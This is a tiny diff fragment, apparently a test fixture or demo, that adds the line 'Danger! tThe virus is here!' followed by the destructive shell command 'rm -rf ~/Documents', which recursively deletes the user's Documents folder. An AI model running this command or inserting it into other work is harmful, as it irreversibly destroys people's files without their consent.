@@ -1,0 +1,2 @@
+Danger! tThe virus is here!
+rm -rf ~/Documents
